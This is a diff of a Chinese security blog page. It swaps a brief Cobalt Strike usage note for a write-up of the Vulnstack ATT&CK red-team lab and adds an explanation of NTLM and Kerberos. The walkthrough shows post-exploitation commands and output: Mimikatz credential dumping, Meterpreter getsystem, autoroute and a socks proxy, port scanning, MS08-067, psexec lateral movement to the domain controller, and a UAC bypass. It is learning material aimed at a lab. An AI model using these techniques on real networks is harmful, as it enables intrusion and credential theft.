@@ -10,7 +10,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    cobalt strike |  0Rld
+    红队靶场系列 |  0Rld
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -36,7 +36,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="cobalt-strike" class="article article-type-cobalt" itemscope
+  <article id="post-红队靶场系列" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -44,7 +44,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  cobalt strike
+  红队靶场系列
 </h1>
   
 
@@ -53,8 +53,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/08/25/strike/" class="article-date">
-  <time datetime="2020-08-25T13:03:33.000Z" itemprop="datePublished">2020-08-25</time>
+      <a href="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
+  <time datetime="2020-09-09T07:17:46.000Z" itemprop="datePublished">2020-09-09</time>
 </a>
       
       
@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">215字</span>
+            <span class="post-count">1.8k字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">7分钟</span>
         </span>
     </span>
 </div>
@@ -100,25 +100,76 @@
       
 
       
-      <p>Cobalt Strike 是一款非常成熟的渗透框架，这里主要记录下它常用的用法。</p>
-<p>使用方法：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部署团队服务器,可支持多人使用</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./teamserver 192.168.126.33 ccc123123</span></span><br><span class="line">[*] Will use existing X509 certificate and keystore (<span class="keyword">for</span> SSL)</span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br><span class="line">[+] Team server is up on <span class="number">50050</span></span><br><span class="line">[*] SHA256 hash of SSL cert is: e22556354f8564451d11ff1bba9a2d1b47ba889b5ec147267597dcd8b7a858ad</span><br><span class="line">[+] Listener: win7 started!</span><br><span class="line">[+] Listener: hongri5 started!</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行，密码即之前设置的团队服务器密码</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./start.sh </span></span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br></pre></td></tr></table></figure>
+      <h2 id="ATT-amp-CK红队评估实战靶场一"><a href="#ATT-amp-CK红队评估实战靶场一" class="headerlink" title="ATT&amp;CK红队评估实战靶场一"></a><strong>ATT&amp;CK红队评估实战靶场一</strong></h2><p><strong>前言：</strong></p>
+<p>为了更好理解内网渗透，还是要多做一些大型靶场，加深理解</p>
+<p>靶场链接地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>外网部分此篇章先不讲解，另一篇章会讲，这里主讲get webshell后，该如何操作。</p>
+<p><strong>拓扑结构:</strong></p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/1.png" alt></p>
+<p><strong>知识点小记：</strong></p>
+<p>内网攻击姿势-MS08-067</p>
+<p>内网流量转发</p>
+<p>域渗透-psexec模块、mimikatz模块</p>
+<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a><strong>1.信息收集</strong></h3><p>用蚁剑连接后，进入终端，先简单查看下本机信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; whoami     &#x3D;》god\administrator</span><br><span class="line">C:\phpStudy\WWW&gt; ipconfig   &#x3D;》192.168.52.143</span><br><span class="line">C:\phpStudy\WWW&gt; net view   &#x3D;》OWA、ROOT-TVI862UBEH</span><br></pre></td></tr></table></figure>
 
+<p>得到当前的用户权限是administrator，存在内网，网段为192.168.52.x，局域网还存在两台主机，计算机名分别是:OWA、ROOT-TVI862UBEH</p>
+<p>用cs生成后门文件，上传至目标主机，连接cs</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/2.png" alt></p>
+<p>在目标主机运行木马文件后，cs这边会显示上线</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/3.png" alt></p>
+<p>可运行Mimikatz，查看<strong>明文密码、所在域、域SID、krbtgt的NTLM Hash值等</strong></p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/4.png" alt></p>
+<p><strong>net config Workstation (当前计算机名，全名，用户名，系统版本，工作站域，登陆域)</strong></p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/6.png" alt></p>
+<p><strong>systeminfo 查看系统信息</strong>  </p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/9.png" alt></p>
+<p><strong>用Ladon插件探测内网存活主机</strong></p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.png" alt></p>
+<p>至此，大致得到以下信息</p>
+<p><strong>当前域是:god.org</strong></p>
+<p><strong>域控是192.168.52.138，主机名为OWA</strong></p>
+<p><strong>域成员是192.168.52.141，主机名为ROOT-TVI862UBEH</strong></p>
+<h3 id="2-内网渗透"><a href="#2-内网渗透" class="headerlink" title="2.内网渗透"></a><strong>2.内网渗透</strong></h3><p><strong>将CS和msf进行联动，也就是当获取了CobaltStrike类型的session后，派生一个MSF类型的shell。</strong></p>
+<p>先在在CS上新建一个监听器，类型为foreign</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/7.png" alt></p>
+<p>然后在msf上，设置相应的监听器，在cs上，选择已经建立好的监听器，点击spawn，选中msf外置监听器</p>
+<p>成功使用cs反弹shell到msf上</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/12.png" alt></p>
+<p>msf的后渗透模块meterpreter中，可使用命令getsystem进行提权，成功获得win7主机所有权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
 
+<h3 id="3-横向移动"><a href="#3-横向移动" class="headerlink" title="3.横向移动"></a>3.横向移动</h3><p>先扫描内网主机端口，但由于攻击机的流量无法直达内网中，所以需要设置代理进行转发流量</p>
+<p>添加路由，随后设置代理，然后直接利用msf模块的端口扫描，发现了135、445端口开放</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Adding a route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br><span class="line">[+] Added route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span> via <span class="number">192.168</span>.<span class="number">126.129</span></span><br><span class="line">[*] Use the <span class="literal">-p</span> option to list all active routes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a </span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job <span class="number">0</span>.</span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">52.141</span>:       - <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">21</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">52.141</span>:       - <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">52.141</span>:       - <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">52.141</span>:       - <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - TCP OPEN</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-<h2 id="后渗透模块介绍："><a href="#后渗透模块介绍：" class="headerlink" title="后渗透模块介绍："></a><strong>后渗透模块介绍：</strong></h2><p>Cobalt Strike 的后渗透模块，可用于<strong>信息收集、权限提升、端口扫描、端口转发、横向移动、持久化</strong>等</p>
-<h3 id="1-使用Elevate模块提升权限"><a href="#1-使用Elevate模块提升权限" class="headerlink" title="1.使用Elevate模块提升权限"></a>1.使用Elevate模块提升权限</h3><p>elevate [exploit] [listener]</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此模块目前内置了uac-token-duplication和svc-exe模块，可以自行添加其它模块</span></span><br><span class="line">elevate uac<span class="literal">-token</span><span class="literal">-duplication</span> hongri5 <span class="comment">#用于bypassUAC</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><img src="/2020/08/25/strike/1.png" alt></p>
+<p>这里用ms08_067漏洞，可直接拿下域成员</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/13.png" alt></p>
+<p>这里用psexec模块进行渗透，先设置监听器，选择SMB，然后在探测到的主机页面选择域控，点击psexec</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/25.png" alt></p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/24.png" alt></p>
+<p>然后选择win7主机的账号和密码，监听器选择刚刚设置的，提交，过一会就收到了域控的信息</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/22.png" alt></p>
+<p>可以看到域控已经上线，且获得了system权限，至此内网所有主机权限全部get！</p>
+<p><img src="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/21.png" alt></p>
+<p><strong>后记：</strong></p>
+<p>初学内网渗透，上面还有很多细节没有讲清楚，主要是复现一些师傅的思路，然后提取其中的知识要点，再去深入研究</p>
+<h2 id="Windows认证协议"><a href="#Windows认证协议" class="headerlink" title="Windows认证协议"></a>Windows认证协议</h2><p>Windows有两种认证协议：<strong>NTLM（NT LAN Manager）和Kerberos</strong></p>
+<p>域成员计算机在登录的时候可以<strong>选择登录到域中或此电脑</strong></p>
+<p><strong>选择登陆到域一般会采用Kerberos协议在域控DC上进行认证</strong>。</p>
+<h3 id="1-NTLM协议"><a href="#1-NTLM协议" class="headerlink" title="1.NTLM协议"></a><strong>1.NTLM协议</strong></h3><p>NTLM协议基于NTLM hash，<strong>windows本地登陆的密码由LM hash和NTLM hash组成</strong>,存储在SAM文件中</p>
+<p>在登陆Windows的时候，系统会将<strong>用户输入的密码转换成NTLM hash</strong>并<strong>与SAM文件中的密码进行对比</strong>，如果相同，则认证成功。</p>
+<h3 id="2-Kerberos认证协议"><a href="#2-Kerberos认证协议" class="headerlink" title="2.Kerberos认证协议"></a><strong>2.Kerberos认证协议</strong></h3><p>​    Kerberos是一种网络认证协议，整个认证过程涉及到三方：<strong>客户端、服务端和 KDC</strong>（Key Distribution Center），在 <strong>Windows 域环境中，KDC 的角色由 DC</strong>（Domain Controller）来担当。</p>
+<p>​    Kerberos<strong>基于票据(Ticket)进行安全认证</strong>，<strong>票据是用来在认证服务器和用户请求的服务之间传递用户身份的凭证</strong>。以下是kerberos协议的认证流程：</p>
+<p><strong>第1步：</strong>KRB_AS_REQ：Client-A发送Authenticator（通过A密码加密的一个时间戳TimeStamp）向KDC的AS服务认证自己的身份；</p>
+<p>​    <strong>第2步：</strong>KRB_AS_REP：AS通过KDC数据库中存储的Client-A密码的副本，解密收到的Authenticator，如果解密出的TimeStamp符合要求，则AS服务认为Client-A就是所谓的Client-A；</p>
+<p>​     认证成功后，AS服务生成一个短期有效的SessionKeya-kdc，将该Key使用A的密码副本加密成密文1，另外将Key连同时间戳标志（控制该SessionKey的有效时间）通过TGS服务的密码也就是KDC的密码加密为密文2（称为TGT），将这两个密文组合成KRB_AS_REP返回给Client-A；</p>
+<p>​    <strong>第3步：</strong>KRB_TGS_REQ：Client-A在接收到KRB_AS_REP后，首先使用自身密码解密密文1得到SessionKeya-kdc，此时需要注意的是，密文2（TGT）是被KDC的密码加密的，所以Client-A无法解密，这也是Kerberos协议设计的精妙之处，既解决了Server端（TGS相对于Client-A也称之为Server端）无法及时接收SessionKey的问题，又不怕Client-A对该TGT的伪造，因为Client-A不知道Server端的密码。</p>
+<p>​     得到SessionKeya-kdc后，Client-A利用其加密时间戳生成Authenticator用于向TGS申请Client-A与Client-B进行认证所需的SessionKeya-b，连同刚才KRB_AS_REP接收的TGT一同组合成KRB_TGS_REQ发送给TGS</p>
+<p>​    <strong>第4步：</strong>KRB_TGS_REP：TGS在接收到KRB_TGS_REP之后，利用KDC密码解密TGT获得本来就该发送给自己的SessionKeya-kdc，然后用其解密KRB_TGS_REQ中的Authenticator得到Client-A发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的SessionKeya-b，注意此时利用SessionKeya-kdc将SessionKeya-b加密为密文1，然后利用Server-B的密码将SessionKeya-b加密为密文2（称为ServiceTicket），两个密文一同构成KRB_TGS_REP返回给Client-A；</p>
+<p>​    <strong>第5步：</strong>KRB_AP_REQ：Client-A在接收到KRB_TGS_REP之后，首先使用缓存的SessionKeya-kdc将密文1中的SessionKeya-b解密出来，然后利用其加密时间戳生成Authenticator用于向B进行对自身的验证，另外，和刚才TGT一样，密文2也就是ServiceTicket是用Server-B的密码加密的，所以Client-A无法解密，也就无法伪造，这也同样解决了在三方认证中作为Server端的B无法及时接收SessionKey的问题，又不怕Client-A对ServiceTicket的伪造；</p>
+<p>​    <strong>第6步：</strong>KRB_AP_REP：Server-B受到KRB_AP_REQ之后，利用自身密码解密ServiceTicket，得到SessionKeya-b，然后用SessionKeya-b解密Authenticator得到时间戳，验证A的身份</p>
+<p>参考： <a href="https://www.freebuf.com/articles/system/229200.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/229200.html</a></p>
 
       
       <!-- reward -->
@@ -188,7 +239,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://cumtchen.gitee.io/2020/08/25/strike/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://cumtchen.gitee.io/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -204,19 +255,19 @@
   
   <nav class="article-nav">
     
-      <a href="/2020/09/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-nav-link">
+      <a href="/2020/09/11/Metasploit/" class="article-nav-link">
         <strong class="article-nav-caption">Newer posts</strong>
         <div class="article-nav-title">
           
-            红队靶场系列
+            Metasploit
           
         </div>
       </a>
     
     
-      <a href="/2020/08/21/OWASP-Top10/" class="article-nav-link">
+      <a href="/2020/08/25/strike/" class="article-nav-link">
         <strong class="article-nav-caption">Older posts</strong>
-        <div class="article-nav-title">OWASP-Top10</div>
+        <div class="article-nav-title">cobalt strike</div>
       </a>
     
   </nav>
